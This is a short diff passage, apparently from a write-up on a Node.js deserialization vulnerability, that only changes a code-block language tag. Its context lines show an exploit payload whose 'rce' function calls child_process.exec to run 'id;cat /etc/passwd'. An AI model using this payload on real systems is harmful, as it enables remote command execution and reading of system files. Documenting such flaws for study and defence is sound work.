@@ -7,7 +7,7 @@ Json to exploit the vulnerability
 ```
 
 which is the serialized version of
-```json
+```js
 var y = {
  rce : function(){
  require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });
